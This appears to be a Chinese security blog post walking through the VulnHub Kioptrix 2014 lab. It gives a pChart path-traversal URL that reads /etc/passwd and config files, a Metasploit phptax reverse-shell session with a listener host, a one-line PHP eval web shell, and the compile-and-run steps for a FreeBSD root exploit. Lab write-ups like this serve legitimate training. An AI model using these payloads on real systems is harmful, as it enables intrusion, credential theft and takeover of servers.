@@ -1,0 +1,188 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/na0pwOquf_o5YJZUEo7w0g)
+
+  
+
+  
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/1brjUjbpg5zGqnux86icY3iaSADXAreXiaJEIOOPug2W5Rich6Cst24vCeB65NNkoxowMh4uZIcwoSUKENv1mFW3ww/640?wx_fmt=png)
+
+点击上方 “信安前线” 可订阅
+
+**0x01** Introduction
+
+* * *
+
+虚拟机下载页面：https://download.vulnhub.com/kioptrix/kiop2014.tar.bz2  
+
+Description
+
+```
+Note from VulnHub
+
+**100% works with \*VMware player6, workstation 10 & fusion 6\*.**
+
+**May have issues with \*ViritualBox\***  *If this is the case, try this 'fix':  http://download.vulnhub.com/kioptrix/kiop2014_fix.zip - Step by Step  screenshots for Virtualbox 4.3 & VMware Workstation 9)*
+```
+
+‍
+
+**0x02 Writeup**  
+
+#### 1 信息收集
+
+##### 1.1 端口信息扫描
+
+nmap 扫描开放端口
+
+```
+root@kali:~# nmap -sS -sV -p 1-65535 -T4 -A 10.0.0.14
+```
+
+##### 1.2 主机漏洞信息扫描
+
+nmap 漏洞脚本库：
+
+```
+root@kali:~# nmap --script=vuln -p 80,8080 10.0.0.145
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 03:12 EDT
+Nmap scan report for 10.0.0.145
+Host is up (0.00053s latency).
+
+PORT     STATE SERVICE
+80/tcp   open  http
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
+8080/tcp open  http-proxy
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
+|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
+```
+
+##### 1.3 web 应用方面
+
+80 端口应用版本信息：
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRazkcsd3cEM5f5DTu2V7Lg2dneEwICria5RvDjMxKSH1Hjd515N0rszeg/640?wx_fmt=png)
+
+8080 端口应用版本信息：
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaDsWX40tmTkPynS1gXhkxGSyic8y4iaQADyTeHy23quKSshQo0sljeE4g/640?wx_fmt=png)
+
+80 端口右键源代码发现敏感路径 pChart2.1.3/index.php
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaqicFEfe7MHABIcZ6RrJ3MKjib9tua500yEVH0hnoJUk1YkHK7mhEJgTA/640?wx_fmt=png)
+
+对目录进行扫描未发现敏感路径。其中 pChart 为 php 的一个制表项目，版本为 2.1.3
+
+#### 2 Flag 获取
+
+##### 2.1 getshell
+
+80 端口网站为一个 cms 是 pChart 的站点，思路为搜索该 cms 的漏洞。在 https://www.exploit-db.com / 搜索该 cms 漏洞
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaQYiag73kqdkACccGsXuneGPnYzSp2WCEribPXibQuRrwV9dVCgUpSYAQw/640?wx_fmt=png)
+
+发现存在任意文件读取漏洞，使用 exp  
+
+```
+http://10.0.0.145/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
+```
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaPYeU3lyyAexKdGUTTWEibNicPD4hUiaYIQ7oq3W0Ppa3h1L0TaZedGs5Q/640?wx_fmt=png)
+
+根据服务器响应头信息推测 80、8080 为同一组件搭建，尝试查看 apache 配置文件 (FreeBSD 9.0.0 默认安装 apache 路径或者 fuzz 路径)
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRa4eibzHbWDjvtlCqVN3Gg8JAiaibxVicatbiccibKhBbUT8NXS1iafibdehunyg/640?wx_fmt=png)
+
+```
+http://10.0.0.145/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
+```
+
+发现 8080 端口应用 apache 配置文件，只允许 User-Agent 为 Mozilla4 的浏览器访问该网站，使用 User Agent Switcher 修改浏览器标示
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRas1eOVxKMZ6GhT9VtZcF2sFgJlFqviaMNUrHgwpiboS8pBPD0M7rQ6AUA/640?wx_fmt=png)
+
+已能访问 8080 端口，发现存在目录遍历，访问发现 cms 为 phptax 系统，在 https://www.exploit-db.com/ 搜索该 cms 漏洞  
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaaBxNkukib9wbaGzsoPHCkRFeMz4cG2C8icT9Hotdh9KIpib4cic82IdlicA/640?wx_fmt=png)
+
+存在远程命令执行漏洞，使用 msf 获取权限
+
+```
+root@kali:~# msfconsole
+msf5 > search phptax
+msf5 > use exploit/multi/http/phptax_exec
+msf5 exploit(multi/http/phptax_exec) > set RHOSTS 10.0.0.145
+msf5 exploit(multi/http/phptax_exec) > set payload cmd/unix/revers
+msf5 exploit(multi/http/phptax_exec) > set LHOST 10.0.0.129
+msf5 exploit(multi/http/phptax_exec) > run
+```
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRa8bFThl7yXukh1epxzka0dTalWTrc9E3hHIRLUPYML3VLiaBFTKiaweibA/640?wx_fmt=png)
+
+getshell
+
+```
+echo '<?php @eval($_POST["x"]);?>' >shell.php
+ ls
+```
+
+http://10.0.0.145:8080/phptax/shell.php
+
+同理拿到 80 端口 webshell
+
+http://10.0.0.145/pChart2.1.3/shell.php
+
+##### 2.2 权限提升
+
+收集系统信息
+
+```
+uname -a
+ uname -r
+```
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaO0RCKpm4GKnZ3kJ3npPda1wiaVu87jY6NVaUYsTs66p6RL9EwU1e8Nw/640?wx_fmt=png)  
+
+在 exploit-db 上搜索 FreeBSD 的本地权限提升 exp
+
+https://www.exploit-db.com/exploits/28718
+
+使用 chopper 连接 webshell，并上传 exp
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaZxfwlwvqyYo7H0Rkf5ia8IvW7MGgxmKKGxP27wMbWoicZmzg4T2Lw06g/640?wx_fmt=png)
+
+```
+cd /tmp
+which gcc
+gcc 28718.c -o 28718
+chmod +x 28718
+./28718
+```
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRarOMRq0GrAEutpakPVe4NMgmKbAhVVqHwXEfNhwnpSF0AVoCvdgO5ng/640?wx_fmt=png)
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRaUH5eDwStfPdXqZ9rKm2DubE2vroAP7kn4icB46WYnr2BL6ic64ttYZPw/640?wx_fmt=png)
+
+flag
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQS8zribyB9tY2oLWKj61IibRauTCOTFQx9LB0uOF5ccS2wMZphtIzFCoKfqkgGbyl6a6lGLwmDg0dyA/640?wx_fmt=png)
+
+**PS：大伙儿节日快乐，珍惜最后一天吧**  
+
+更多精彩
+
+*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
+    
+*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 KIOPTRIX: LEVEL 1.3 (#4) 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487021&idx=1&sn=778b332aea5754ca1bf4d6523aaaedad&chksm=fcfc337bcb8bba6d3c00ada8ed725ee5e9e90499d2afb0e54f24bb17456bdb08beab5374188b&scene=21#wechat_redirect)  
+    
+*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
+    
+
+![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)
+
+**如果感觉文章不错，分享让更多的人知道吧！**
